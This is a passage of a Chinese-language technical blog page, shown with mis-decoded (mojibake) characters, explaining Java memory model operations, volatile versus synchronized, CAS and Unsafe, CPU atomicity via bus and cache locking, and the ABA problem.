<li>assign(èµ‹å€¼)ï¼šä½œç”¨äºå·¥ä½œå†…å­˜ï¼Œå®ƒæŠŠä»æ‰§è¡Œå¼•æ“è·å–çš„å€¼èµ‹å€¼ç»™å·¥ä½œå†…å­˜ä¸­çš„å˜é‡ï¼Œæ¯å½“è™šæ‹Ÿæœºé‡åˆ°ä¸€ä¸ªç»™å˜é‡èµ‹å€¼çš„æŒ‡ä»¤æ—¶å€™ï¼Œæ‰§è¡Œè¯¥æ“ä½œï¼›</li>
<li>store(å­˜å‚¨)ï¼šä½œç”¨äºå·¥ä½œå†…å­˜ï¼Œå®ƒæŠŠå·¥ä½œå†…å­˜ä¸­çš„ä¸€ä¸ªå˜é‡ä¼ é€ç»™ä¸»å†…å­˜ä¸­ï¼Œä»¥å¤‡éšåçš„writeæ“ä½œä½¿ç”¨ï¼›</li>
<li>write(å†™å…¥)ï¼šä½œç”¨äºä¸»å†…å­˜ï¼Œå®ƒæŠŠstoreä¼ é€å€¼æ”¾åˆ°ä¸»å†…å­˜ä¸­çš„å˜é‡ä¸­ã€‚</li>
<li>unlock(è§£é”)ï¼šä½œç”¨äºä¸»å†…å­˜ï¼Œå®ƒå°†ä¸€ä¸ªå¤„äºé”å®šçŠ¶æ€çš„å˜é‡é‡Šæ”¾å‡ºæ¥ï¼Œé‡Šæ”¾åçš„å˜é‡æ‰èƒ½å¤Ÿè¢«å…¶ä»–çº¿ç¨‹é”å®šï¼›</li>
</ul>
<p>Javaå†…å­˜æ¨¡å‹è¿˜è§„å®šäº†æ‰§è¡Œä¸Šè¿°8ç§åŸºæœ¬æ“ä½œæ—¶å¿…é¡»æ»¡è¶³å¦‚ä¸‹è§„åˆ™:</p>
<p>ï¼ˆ1ï¼‰ä¸å…è®¸readå’Œloadã€storeå’Œwriteæ“ä½œä¹‹ä¸€å•ç‹¬å‡ºç°ï¼ˆå³ä¸å…è®¸ä¸€ä¸ªå˜é‡ä»ä¸»å­˜è¯»å–äº†ä½†æ˜¯å·¥ä½œå†…å­˜ä¸æ¥å—ï¼Œæˆ–è€…ä»å·¥ä½œå†…å­˜å‘èµ·ä¼šå†™äº†ä½†æ˜¯ä¸»å­˜ä¸æ¥å—çš„æƒ…å†µï¼‰ï¼Œä»¥ä¸Šä¸¤ä¸ªæ“ä½œå¿…é¡»æŒ‰é¡ºåºæ‰§è¡Œï¼Œä½†æ²¡æœ‰ä¿è¯å¿…é¡»è¿ç»­æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œreadä¸loadä¹‹é—´ã€storeä¸writeä¹‹é—´æ˜¯å¯æ’å…¥å…¶ä»–æŒ‡ä»¤çš„ã€‚</p>
<p>ï¼ˆ2ï¼‰ä¸å…è®¸ä¸€ä¸ªçº¿ç¨‹ä¸¢å¼ƒå®ƒçš„æœ€è¿‘çš„assignæ“ä½œï¼Œå³å˜é‡åœ¨å·¥ä½œå†…å­˜ä¸­æ”¹å˜äº†ä¹‹åå¿…é¡»æŠŠè¯¥å˜åŒ–åŒæ­¥å›ä¸»å†…å­˜ã€‚</p>
<p>ï¼ˆ3ï¼‰ä¸å…è®¸ä¸€ä¸ªçº¿ç¨‹æ— åŸå› åœ°ï¼ˆæ²¡æœ‰å‘ç”Ÿè¿‡ä»»ä½•assignæ“ä½œï¼‰æŠŠæ•°æ®ä»çº¿ç¨‹çš„å·¥ä½œå†…å­˜åŒæ­¥å›ä¸»å†…å­˜ä¸­ã€‚</p>
<p>ï¼ˆ4ï¼‰ä¸€ä¸ªæ–°çš„å˜é‡åªèƒ½ä»ä¸»å†…å­˜ä¸­â€œè¯ç”Ÿâ€ï¼Œä¸å…è®¸åœ¨å·¥ä½œå†…å­˜ä¸­ç›´æ¥ä½¿ç”¨ä¸€ä¸ªæœªè¢«åˆå§‹åŒ–ï¼ˆloadæˆ–assignï¼‰çš„å˜é‡ï¼Œæ¢å¥è¯è¯´å°±æ˜¯å¯¹ä¸€ä¸ªå˜é‡å®æ–½useå’Œstoreæ“ä½œä¹‹å‰ï¼Œå¿…é¡»å…ˆæ‰§è¡Œè¿‡äº†assignå’Œloadæ“ä½œã€‚</p>
<p>ï¼ˆ5ï¼‰ä¸€ä¸ªå˜é‡åœ¨åŒä¸€ä¸ªæ—¶åˆ»åªå…è®¸ä¸€æ¡çº¿ç¨‹å¯¹å…¶æ‰§è¡Œlockæ“ä½œï¼Œä½†lockæ“ä½œå¯ä»¥è¢«åŒä¸€ä¸ªæ¡çº¿ç¨‹é‡å¤æ‰§è¡Œå¤šæ¬¡ï¼Œå¤šæ¬¡æ‰§è¡Œlockåï¼Œåªæœ‰æ‰§è¡Œç›¸åŒæ¬¡æ•°çš„unlockæ“ä½œï¼Œå˜é‡æ‰ä¼šè¢«è§£é”ã€‚</p>
<p>ï¼ˆ6ï¼‰å¦‚æœå¯¹ä¸€ä¸ªå˜é‡æ‰§è¡Œlockæ“ä½œï¼Œå°†ä¼šæ¸…ç©ºå·¥ä½œå†…å­˜ä¸­æ­¤å˜é‡çš„å€¼ï¼Œåœ¨æ‰§è¡Œå¼•æ“ä½¿ç”¨è¿™ä¸ªå˜é‡å‰ï¼Œéœ€è¦é‡æ–°æ‰§è¡Œloadæˆ–assignæ“ä½œåˆå§‹åŒ–å˜é‡çš„å€¼ã€‚</p>
<p>ï¼ˆ7ï¼‰å¦‚æœä¸€ä¸ªå˜é‡å®ç°æ²¡æœ‰è¢«lockæ“ä½œé”å®šï¼Œåˆ™ä¸å…è®¸å¯¹å®ƒæ‰§è¡Œunlockæ“ä½œï¼Œä¹Ÿä¸å…è®¸å»unlockä¸€ä¸ªè¢«å…¶ä»–çº¿ç¨‹é”å®šçš„å˜é‡ã€‚</p>
<p>ï¼ˆ8ï¼‰å¯¹ä¸€ä¸ªå˜é‡æ‰§è¡Œunlockæ“ä½œä¹‹å‰ï¼Œå¿…é¡»å…ˆæŠŠæ­¤å˜é‡åŒæ­¥å›ä¸»å†…å­˜ï¼ˆæ‰§è¡Œstoreå’Œwriteæ“ä½œï¼‰ã€‚</p>
<h3 id="å¹¶å‘ç¼–ç¨‹çš„ä¸‰ä¸ªé‡è¦ç‰¹æ€§"><a href="#å¹¶å‘ç¼–ç¨‹çš„ä¸‰ä¸ªé‡è¦ç‰¹æ€§" class="headerlink" title="å¹¶å‘ç¼–ç¨‹çš„ä¸‰ä¸ªé‡è¦ç‰¹æ€§"></a>å¹¶å‘ç¼–ç¨‹çš„ä¸‰ä¸ªé‡è¦ç‰¹æ€§</h3><p>åŸå­æ€§;å¯è§æ€§;æœ‰åºæ€§</p>
<h3 id="synchronizedå’Œvolatileçš„åŒºåˆ«"><a href="#synchronizedå’Œvolatileçš„åŒºåˆ«" class="headerlink" title="synchronizedå’Œvolatileçš„åŒºåˆ«"></a>synchronizedå’Œvolatileçš„åŒºåˆ«</h3><ul>
<li>volatile å…³é”®å­—æ˜¯çº¿ç¨‹åŒæ­¥çš„è½»é‡çº§å®ç°ï¼Œæ‰€ä»¥volatileæ€§èƒ½æ¯”synchronizedå…³é”®å­—è¦å¥½ã€‚ä½†æ˜¯volatile å…³é”®å­—åªèƒ½ç”¨äºå˜é‡è€Œ synchronized å…³é”®å­—å¯ä»¥ä¿®é¥°æ–¹æ³•ä»¥åŠä»£ç å—ã€‚</li>
<li>volatile å…³é”®å­—èƒ½ä¿è¯æ•°æ®çš„å¯è§æ€§ï¼Œä½†ä¸èƒ½ä¿è¯æ•°æ®çš„åŸå­æ€§ã€‚synchronized å…³é”®å­—ä¸¤è€…éƒ½èƒ½ä¿è¯ã€‚</li>
<li>volatileå…³é”®å­—ä¸»è¦ç”¨äºè§£å†³å˜é‡åœ¨å¤šä¸ªçº¿ç¨‹ä¹‹é—´çš„å¯è§æ€§ï¼Œè€Œ synchronized å…³é”®å­—è§£å†³çš„æ˜¯å¤šä¸ªçº¿ç¨‹ä¹‹é—´è®¿é—®èµ„æºçš„åŒæ­¥æ€§ã€‚</li>
</ul>
<h2 id="CAS"><a href="#CAS" class="headerlink" title="CAS"></a>CAS</h2><p>javaæ— æ³•æ“ä½œå†…å­˜,Javaå¯ä»¥è°ƒç”¨c++, C++å¯ä»¥æ“ä½œå†…å­˜; javaå¯ä»¥é€šè¿‡unsafeç±»æ“ä½œå†…å­˜;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è¯»å–ä¼ å…¥å¯¹è±¡oåœ¨å†…å­˜ä¸­åç§»é‡ä¸ºoffsetä½ç½®çš„å€¼ä¸æœŸæœ›å€¼expectedä½œæ¯”è¾ƒã€‚ç›¸ç­‰å°±æŠŠxå€¼èµ‹å€¼ç»™offsetä½ç½®çš„å€¼ã€‚æ–¹æ³•è¿”å›trueã€‚ä¸ç›¸ç­‰ï¼Œå°±å–æ¶ˆèµ‹å€¼ï¼Œæ–¹æ³•è¿”å›falseã€‚</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">compareAndSwapInt</span><span class="params">(Object o, <span class="type">long</span> offset,</span></span><br><span class="line"><span class="params">                                              <span class="type">int</span> expected,</span></span><br><span class="line"><span class="params">                                              <span class="type">int</span> x)</span>;</span><br></pre></td></tr></table></figure>

<p>CASçš„å…¨ç§°ä¸ºCompare And Swapï¼Œç›´è¯‘å°±æ˜¯æ¯”è¾ƒäº¤æ¢ã€‚æ˜¯ä¸€æ¡CPUçš„åŸå­æŒ‡ä»¤ï¼Œå…¶ä½œç”¨æ˜¯è®©CPUå…ˆè¿›è¡Œæ¯”è¾ƒä¸¤ä¸ªå€¼æ˜¯å¦ç›¸ç­‰ï¼Œç„¶ååŸå­åœ°æ›´æ–°æŸä¸ªä½ç½®çš„å€¼ï¼Œå…¶å®ç°æ–¹å¼æ˜¯åŸºäºç¡¬ä»¶å¹³å°çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œåœ¨intelçš„CPUä¸­ï¼Œä½¿ç”¨çš„æ˜¯cmpxchgæŒ‡ä»¤ï¼Œå°±æ˜¯è¯´CASæ˜¯é ç¡¬ä»¶å®ç°çš„ï¼Œä»è€Œåœ¨ç¡¬ä»¶å±‚é¢æå‡æ•ˆç‡ã€‚</p>
<p>å®ƒæ˜¯ä¸€ä¸ªæ— é”çš„åŸå­ç®—æ³•ã€‚æ‰€ä»¥å®ƒå°±æ˜¯ä¸€ä¸ªä¹è§‚é”ï¼Œä¹Ÿå°±æ˜¯ä¸åŠ é”ã€‚æ— é”ä¹Ÿå°±æ²¡æœ‰åŠ é”å’Œè§£é”çš„è¿‡ç¨‹ï¼Œä¸å­˜åœ¨é˜»å¡ï¼Œä¹Ÿå°±æé«˜äº†æ•ˆç‡ï¼Œæé«˜äº†CPUçš„ååé‡ï¼ˆå•ä½æ—¶é—´å†…æ‰§è¡Œå®Œæˆçš„æ“ä½œæ¡æ•°å°±å¤šäº†ï¼‰</p>
<h3 id="CPUå®ç°åŸå­æ“ä½œçš„åŸç†"><a href="#CPUå®ç°åŸå­æ“ä½œçš„åŸç†" class="headerlink" title="CPUå®ç°åŸå­æ“ä½œçš„åŸç†"></a>CPUå®ç°åŸå­æ“ä½œçš„åŸç†</h3><ol>
<li>æµ‹è¯•å¹¶è®¾ç½®ï¼ˆTetst-and-Setï¼‰</li>
<li>è·å–å¹¶å¢åŠ ï¼ˆFetch-and-Incrementï¼‰</li>
<li>äº¤æ¢ï¼ˆSwapï¼‰</li>
<li>æ¯”è¾ƒå¹¶äº¤æ¢ï¼ˆCompare-and-Swapï¼‰</li>
<li>åŠ è½½é“¾æ¥&#x2F;æ¡ä»¶å­˜å‚¨ï¼ˆLoad-Linked&#x2F;Store-Conditionalï¼‰</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848046.png" alt="img"></p>
<p>4.1 å¤„ç†å™¨è‡ªåŠ¨ä¿è¯åŸºæœ¬å†…å­˜æ“ä½œçš„åŸå­æ€§<br>é¦–å…ˆå¤„ç†å™¨ä¼šè‡ªåŠ¨ä¿è¯åŸºæœ¬çš„å†…å­˜æ“ä½œçš„åŸå­æ€§ã€‚å¤„ç†å™¨ä¿è¯ä»ç³»ç»Ÿå†…å­˜å½“ä¸­è¯»å–æˆ–è€…å†™å…¥ä¸€ä¸ªå­—èŠ‚æ˜¯åŸå­çš„ï¼Œæ„æ€æ˜¯å½“ä¸€ä¸ªå¤„ç†å™¨è¯»å–ä¸€ä¸ªå­—èŠ‚æ—¶ï¼Œå…¶ä»–å¤„ç†å™¨ä¸èƒ½è®¿é—®è¿™ä¸ªå­—èŠ‚çš„å†…å­˜åœ°å€ã€‚å¥”è…¾6å’Œæœ€æ–°çš„å¤„ç†å™¨èƒ½è‡ªåŠ¨ä¿è¯å•å¤„ç†å™¨å¯¹åŒä¸€ä¸ªç¼“å­˜è¡Œé‡Œè¿›è¡Œ16&#x2F;32&#x2F;64ä½çš„æ“ä½œæ˜¯åŸå­çš„ï¼Œä½†æ˜¯å¤æ‚çš„å†…å­˜æ“ä½œå¤„ç†å™¨ä¸èƒ½è‡ªåŠ¨ä¿è¯å…¶åŸå­æ€§ï¼Œæ¯”å¦‚è·¨æ€»çº¿å®½åº¦ï¼Œè·¨å¤šä¸ªç¼“å­˜è¡Œï¼Œè·¨é¡µè¡¨çš„è®¿é—®ã€‚ä½†æ˜¯å¤„ç†å™¨æä¾›æ€»çº¿é”å®šå’Œç¼“å­˜é”å®šä¸¤ä¸ªæœºåˆ¶æ¥ä¿è¯å¤æ‚å†…å­˜æ“ä½œçš„åŸå­æ€§ã€‚</p>
<p>4.2 é€šè¿‡æ€»çº¿é”å®šæ¥ä¿è¯åŸå­æ€§(ç±»ä¼¼äºæ•°æ®åº“è¡¨é”,é‡é‡çº§é”)<br>æ€»çº¿é”å®šå…¶å®å°±æ˜¯å¤„ç†å™¨ä½¿ç”¨äº†æ€»çº¿é”ï¼Œæ‰€è°“æ€»çº¿é”å°±æ˜¯ä½¿ç”¨å¤„ç†å™¨æä¾›çš„ä¸€ä¸ª LOCK# ä¿¡å·ï¼Œå½“ä¸€ä¸ªå¤„ç†å™¨åœ¨æ€»çº¿ä¸Šè¾“å‡ºæ­¤ä¿¡å·æ—¶ï¼Œå…¶ä»–å¤„ç†å™¨çš„è¯·æ±‚å°†è¢«é˜»å¡ä½ï¼Œé‚£ä¹ˆè¯¥å¤„ç†å™¨å¯ä»¥ç‹¬å å…±äº«å†…å­˜ã€‚ä½†æ˜¯è¯¥æ–¹æ³•æˆæœ¬å¤ªå¤§ã€‚å› æ­¤æœ‰äº†ä¸‹é¢çš„æ–¹å¼ã€‚</p>
<p>4.3 é€šè¿‡ç¼“å­˜é”å®šæ¥ä¿è¯åŸå­æ€§(ç±»ä¼¼äºæ•°æ®åº“è¡Œé”)<br>åœ¨åŒä¸€æ—¶åˆ»æˆ‘ä»¬åªéœ€ä¿è¯å¯¹æŸä¸ªå†…å­˜åœ°å€çš„æ“ä½œæ˜¯åŸå­æ€§å³å¯ï¼Œä½†æ€»çº¿é”å®šæŠŠCPUå’Œå†…å­˜ä¹‹é—´é€šä¿¡é”ä½äº†ï¼Œè¿™ä½¿å¾—é”å®šæœŸé—´ï¼Œå…¶ä»–å¤„ç†å™¨ä¸èƒ½æ“ä½œå…¶ä»–å†…å­˜åœ°å€çš„æ•°æ®ï¼Œæ‰€ä»¥æ€»çº¿é”å®šçš„å¼€é”€æ¯”è¾ƒå¤§ï¼Œæœ€è¿‘çš„å¤„ç†å™¨åœ¨æŸäº›åœºåˆä¸‹ä½¿ç”¨ç¼“å­˜é”å®šä»£æ›¿æ€»çº¿é”å®šã€‚</p>
<p>æ‰€è°“ç¼“å­˜é”å®š æ˜¯æŒ‡å†…å­˜åŒºåŸŸå¦‚æœè¢«ç¼“å­˜åœ¨å¤„ç†å™¨çš„ç¼“å­˜è¡Œä¸­ï¼Œå¹¶ä¸”åœ¨Lock æ“ä½œæœŸé—´è¢«é”å®šï¼Œé‚£ä¹ˆå½“å®ƒæ‰§è¡Œæ“ä½œå†™å›åˆ°å†…å­˜æ—¶ï¼Œå¤„ç†å™¨ä¸åœ¨æ€»çº¿ä¸Šè¾“å‡º LOCK# ä¿¡å·ï¼Œè€Œæ˜¯ä¿®æ”¹å†…éƒ¨çš„å†…å­˜åœ°å€ï¼Œå¹¶å…è®¸å®ƒçš„ç¼“å­˜ä¸€è‡´æ€§æœºåˆ¶æ¥ä¿è¯æ“ä½œçš„åŸå­æ€§ï¼Œå› ä¸ºç¼“å­˜ä¸€è‡´æ€§æœºåˆ¶ä¼šé˜»æ­¢åŒæ—¶ä¿®æ”¹ä¸¤ä¸ªä»¥ä¸Šå¤„ç†å™¨ç¼“å­˜çš„å†…å­˜åŒºåŸŸæ•°æ®ï¼ˆè¿™é‡Œå’Œ volatile çš„å¯è§æ€§åŸç†ç›¸åŒï¼‰ï¼Œå½“å…¶ä»–å¤„ç†å™¨å›å†™å·²è¢«é”å®šçš„ç¼“å­˜è¡Œçš„æ•°æ®æ—¶ï¼Œä¼šä½¿ç¼“å­˜è¡Œæ— æ•ˆã€‚</p>
<p>æ³¨æ„ï¼šæœ‰ä¸¤ç§æƒ…å†µä¸‹å¤„ç†å™¨ä¸ä¼šä½¿ç”¨ç¼“å­˜é”å®š</p>
<p>å½“æ“ä½œçš„æ•°æ®ä¸èƒ½è¢«ç¼“å­˜åœ¨å¤„ç†å™¨å†…éƒ¨ï¼Œæˆ–æ“ä½œçš„æ•°æ®è·¨å¤šä¸ªç¼“å­˜è¡Œæ—¶ï¼Œåˆ™å¤„ç†å™¨ä¼šè°ƒç”¨æ€»çº¿é”å®šã€‚<br>æœ‰äº›å¤„ç†å™¨ä¸æ”¯æŒç¼“å­˜é”å®šï¼Œå¯¹äº Intel 486 å’Œ Pentium å¤„ç†å™¨ï¼Œå°±æ˜¯é”å®šçš„å†…å­˜åŒºåŸŸåœ¨å¤„ç†å™¨çš„ç¼“å­˜è¡Œä¹Ÿä¼šè°ƒç”¨æ€»çº¿é”å®šã€‚</p>
<p>586ä¹‹å‰çš„CPU, ä¼šé€šè¿‡<strong>LOCK</strong>é”æ€»çº¿çš„å½¢å¼æ¥å®ç°åŸå­æ“ä½œ. 686å¼€å§‹åˆ™æä¾›äº†å­˜å‚¨ä¸€è‡´æ€§(Cache coherence), è¿™æ˜¯å¤šå¤„ç†çš„åŸºç¡€, ä¹Ÿæ˜¯åŸå­æ“ä½œçš„åŸºç¡€.</p>
<p>åŸå­æŒ‡ä»¤åœ¨è½¯ä»¶ä¸Šçœ‹æ¥é€»è¾‘å¹¶ä¸å¤æ‚ï¼Œä½†åœ¨å¾®æ¶æ„ä¸Šçœ‹ï¼Œæˆæœ¬æ˜¯å¾ˆé«˜çš„ã€‚å¦‚æœæˆ‘ä»¬æŠŠCPU å’Œå†…å­˜éƒ½çœ‹åšæ˜¯æ€»çº¿ä¸Šçš„ä¸€ä¸ªä¸ªç‹¬ç«‹çš„å®ä½“ï¼Œæœ‰ä¸€ä¸ªCPUè¦åšCASæŒ‡ä»¤ï¼Œè¿™ä¸ªCPUéœ€è¦å…ˆä» å†…å­˜ä¸­è¯»ä¸€ä¸ªå€¼ï¼ŒåŒæ—¶è¦åœ¨å†…å­˜æ§åˆ¶å™¨ä¸Šè®¾ç½®ä¸€ä¸ªæ ‡å¿—ï¼Œä¿è¯å…¶ä»–CPUå†™ä¸è¿›å»ï¼Œç­‰å®ƒæ¯”è¾ƒå®Œäº†ï¼Œç„¶åå†å†³å®šå†™ä¸€ä¸ªå€¼å›å»ï¼Œæ‰ä¼šè®©å…¶ä»–CPUå†™å…¥ã€‚</p>
<p>ä¸åŒå¾®æ¶æ„å®ç°æœ‰ä¸åŒæ–¹æ³•å¯¹è¡Œä¸ºè¿›è¡Œä¼˜åŒ–ï¼Œåœ¨é²²é¹920(æ˜¯<a href="https://baike.baidu.com/item/%E5%8D%8E%E4%B8%BA/298705">åä¸º</a>åœ¨2019å¹´1æœˆå‘å¸ƒçš„æ•°æ®ä¸­å¿ƒé«˜æ€§èƒ½å¤„ç†å™¨)ä¸Šï¼ŒåŸå­æŒ‡ä»¤çš„è¯·æ±‚éœ€è¦åœ¨ L3Cacheä¸Šè¿›è¡Œæ’é˜Ÿï¼Œä¿è¯åœ¨åŸå­æ“ä½œçš„å¤šä¸ªåŠ¨ä½œä¹‹é—´èƒ½ç»´æŒåŸå­æŒ‡ä»¤è¦æ±‚çš„è¯­ä¹‰ã€‚è¿™ä¸ªæ’é˜Ÿæœ¬èº«ä¹Ÿæœ‰æˆæœ¬ã€‚æ‰€ä»¥æ²¡æœ‰åŸå­éœ€è¦å°±ä¸è¦è½»æ˜“ç”¨åŸå­å˜é‡ï¼Œè¿™å…¶å®æ˜¯æœ‰æˆæœ¬çš„ã€‚</p>
<p>å¹¸è¿çš„æ˜¯, ç¼“å­˜ä¸€è‡´æ€§åè®®æä¾›äº†åŸå­æ€§è¢«ä¿éšœçš„åŸºç¡€. ä¸¾ä¾‹æ¥è¯´, å½“é‡åˆ°ä¸€ä¸ªåŸå­æŒ‡ä»¤æ—¶, è¿™ä¸ªåè®®çŸ¥é“éœ€è¦ä¿è¯åŸå­æ€§. ä»–é¦–å…ˆè·å¾—å¯¹å­˜å‚¨å•å…ƒMçš„â€ç‹¬å®¶æ‰€æœ‰æƒâ€ (é€šè¿‡å°†å…¶ä»–åŒ…å«Mçš„ç¼“å­˜å—ä¸­çš„æ‹·è´éƒ½ç½®ä¸ºæ— æ•ˆ). å½“è·å¾—ç‹¬å®¶æ‰€æœ‰æƒä¹‹å, è¿™ä¸ªåè®®ä¼šç¡®ä¿åªæœ‰ä¸€ä¸ªå¤„ç†å™¨èƒ½å¤Ÿè®¿é—®è¿™ä¸ªå—, è€Œå¦‚æœå…¶ä»–å¤„ç†å™¨åœ¨æ­¤æ—¶æƒ³è¦è®¿é—®çš„è¯å°±ä¼šç»å†ç¼“å­˜ç¼ºå¤±, æ¥ä¸‹æ¥åŸå­æŒ‡ä»¤å°±å¯ä»¥æ‰§è¡Œ. åœ¨åŸå­æŒ‡ä»¤æŒç»­æœŸé—´, å…¶ä»–å¤„ç†å™¨ä¸å…è®¸â€å·èµ°â€è¿™ä¸ªå—. å…·ä½“æ¥è¯´, å¦‚é€šå¦ä¸€ä¸ªå¤„ç†å™¨è¦æ±‚è¯»æˆ–è€…å†™è¿™ä¸ªå—, è¿™ä¸ªå—å°±è¢«â€å·â€äº†(å¦‚å—è¢«æ¸…ç†, å—çš„çŠ¶æ€è¢«é™çº§ä¸ºæ— æ•ˆ). åœ¨åŸå­æŒ‡ä»¤å®Œæˆä¹‹å‰æš´éœ²å—ä¼šç ´åæŒ‡ä»¤çš„åŸå­æ€§, â€¦â€¦</p>
<h3 id="CASçš„é—®é¢˜-è‡ªæ—‹æµªè´¹cpuèµ„æº"><a href="#CASçš„é—®é¢˜-è‡ªæ—‹æµªè´¹cpuèµ„æº" class="headerlink" title="CASçš„é—®é¢˜  è‡ªæ—‹æµªè´¹cpuèµ„æº"></a>CASçš„é—®é¢˜  è‡ªæ—‹æµªè´¹cpuèµ„æº</h3><p>å¾ªç¯æ—¶é—´å¤ªé•¿; åªèƒ½ä¿å­˜ä¸€ä¸ªå…±äº«å˜é‡åŸå­æ“ä½œ; ABAé—®é¢˜;CASé€ æˆCacheä¸€è‡´æ€§æµé‡è¿‡å¤§;</p>
<h5 id="ABAé—®é¢˜"><a href="#ABAé—®é¢˜" class="headerlink" title="ABAé—®é¢˜"></a>ABAé—®é¢˜</h5><p>å‰å¥³å‹å¤åˆåï¼Œå¥¹å¯èƒ½è°ˆè¿‡å¤šä¸ª</p>
<p>CASéœ€è¦æ£€æŸ¥æ“ä½œå€¼æœ‰æ²¡æœ‰å‘ç”Ÿæ”¹å˜ï¼Œå¦‚æœæ²¡æœ‰å‘ç”Ÿæ”¹å˜åˆ™æ›´æ–°ã€‚ä½†æ˜¯å­˜åœ¨è¿™æ ·ä¸€ç§æƒ…å†µï¼šå¦‚æœä¸€ä¸ªå€¼åŸæ¥æ˜¯Aï¼Œå˜æˆäº†Bï¼Œç„¶ååˆå˜æˆäº†Aï¼Œé‚£ä¹ˆåœ¨CASæ£€æŸ¥çš„æ—¶å€™ä¼šå‘ç°æ²¡æœ‰æ”¹å˜ï¼Œä½†æ˜¯å®è´¨ä¸Šå®ƒå·²ç»å‘ç”Ÿäº†æ”¹å˜ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„ABAé—®é¢˜ã€‚å¯¹äºABAé—®é¢˜å…¶è§£å†³æ–¹æ¡ˆæ˜¯åŠ ä¸Šç‰ˆæœ¬å·ï¼Œå³åœ¨æ¯ä¸ªå˜é‡éƒ½åŠ ä¸Šä¸€ä¸ªç‰ˆæœ¬å·ï¼Œæ¯æ¬¡æ”¹å˜æ—¶åŠ 1ï¼Œå³A â€”&gt; B â€”&gt; Aï¼Œå˜æˆ1A â€”&gt; 2B â€”&gt; 3Aã€‚</p>
<p>ä»Java1.5 å¼€å§‹JDKçš„atomicåŒ…é‡Œæä¾›äº†ä¸€ä¸ªç±»AtomicStampedReferenceæ¥è§£å†³ABAé—®é¢˜ã€‚è¿™ä¸ªç±»çš„compareAndSetæ–¹æ³•ä½œç”¨æ˜¯é¦–å…ˆæ£€æŸ¥å½“å‰å¼•ç”¨æ˜¯å¦ç­‰äºé¢„æœŸå¼•ç”¨ï¼Œå¹¶ä¸”å½“å‰æ ‡å¿—æ˜¯å¦ç­‰äºé¢„æœŸæ ‡å¿—ï¼Œå¦‚æœå…¨éƒ¨ç›¸ç­‰ï¼Œåˆ™ä»¥åŸå­æ–¹å¼å°†è¯¥å¼•ç”¨å’Œè¯¥æ ‡å¿—çš„å€¼è®¾ç½®ä¸ºç»™å®šçš„æ›´æ–°å€¼ã€‚å…¶å®å°±ç±»ä¼¼äºå¼•å…¥äº†ç‰ˆæœ¬æ¦‚å¿µï¼Œç»™æ¯ä¸€ä¸ªæ•°æ®éƒ½æœ‰ä¸€ä¸ªå®ƒå”¯ä¸€çš„ç‰ˆæœ¬å·ï¼Œé€šå…³æ£€æŸ¥ç‰ˆæœ¬å·æ¥åˆ¤æ–­æ•°æ®æ˜¯å¦è¢«ä¿®æ”¹ã€‚</p>
<h5 id="ä¸€è‡´æ€§æµé‡è¿‡å¤§é—®é¢˜"><a href="#ä¸€è‡´æ€§æµé‡è¿‡å¤§é—®é¢˜" class="headerlink" title="ä¸€è‡´æ€§æµé‡è¿‡å¤§é—®é¢˜"></a>ä¸€è‡´æ€§æµé‡è¿‡å¤§é—®é¢˜</h5><p>ç°åœ¨å‡ ä¹æ‰€æœ‰çš„é”éƒ½æ˜¯å¯é‡å…¥çš„ï¼Œå³å·²ç»è·å¾—é”çš„çº¿ç¨‹å¯ä»¥å¤šæ¬¡é”ä½&#x2F;è§£é”ç›‘è§†å¯¹è±¡ï¼ŒæŒ‰ç…§ä¹‹å‰çš„HotSpotè®¾è®¡ï¼Œæ¯æ¬¡åŠ é”&#x2F;è§£é”éƒ½ä¼šæ¶‰åŠåˆ°ä¸€äº›CASæ“ä½œï¼ˆæ¯”å¦‚å¯¹ç­‰å¾…é˜Ÿåˆ—çš„CASæ“ä½œï¼‰ï¼ŒCASæ“ä½œä¼šå»¶è¿Ÿæœ¬åœ°è°ƒç”¨(ä½¿æœ¬åœ°è°ƒç”¨ä¸æ˜¯é‚£ä¹ˆåŠæ—¶)ï¼Œå› æ­¤åå‘é”çš„æƒ³æ³•æ˜¯ ä¸€æ—¦çº¿ç¨‹ç¬¬ä¸€æ¬¡è·å¾—äº†ç›‘è§†å¯¹è±¡ï¼Œä¹‹åè®©ç›‘è§†å¯¹è±¡â€œåå‘â€è¿™ä¸ªçº¿ç¨‹ï¼Œä¹‹åçš„å¤šæ¬¡è°ƒç”¨åˆ™å¯ä»¥é¿å…CASæ“ä½œï¼Œè¯´ç™½äº†å°±æ˜¯ç½®ä¸ªå˜é‡ï¼Œå¦‚æœå‘ç°ä¸ºtrueåˆ™æ— éœ€å†èµ°å„ç§åŠ é”&#x2F;è§£é”æµç¨‹ã€‚è½»é‡çº§é”å°±æ˜¯åŸºäºCASæ“ä½œçš„</p>
<p>CASä¸ºä»€ä¹ˆä¼šå¼•å…¥æœ¬åœ°å»¶è¿Ÿï¼Ÿè¿™è¦ä»SMPï¼ˆå¯¹ç§°å¤šå¤„ç†å™¨ï¼‰æ¶æ„è¯´èµ·ï¼Œä¸‹å›¾å¤§æ¦‚è¡¨æ˜äº†SMPçš„ç»“æ„ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848046.png" alt="img"></p>
<p>å…¶æ„æ€æ˜¯ æ‰€æœ‰çš„CPUä¼šå…±äº«ä¸€æ¡ç³»ç»Ÿæ€»çº¿ï¼ˆBUSï¼‰ï¼Œé æ­¤æ€»çº¿è¿æ¥ä¸»å­˜ã€‚æ¯ä¸ªæ ¸éƒ½æœ‰è‡ªå·±çš„ä¸€çº§ç¼“å­˜ï¼Œå„æ ¸ç›¸å¯¹äºBUSå¯¹ç§°åˆ†å¸ƒï¼Œå› æ­¤è¿™ç§ç»“æ„ç§°ä¸ºâ€œå¯¹ç§°å¤šå¤„ç†å™¨â€ã€‚</p>
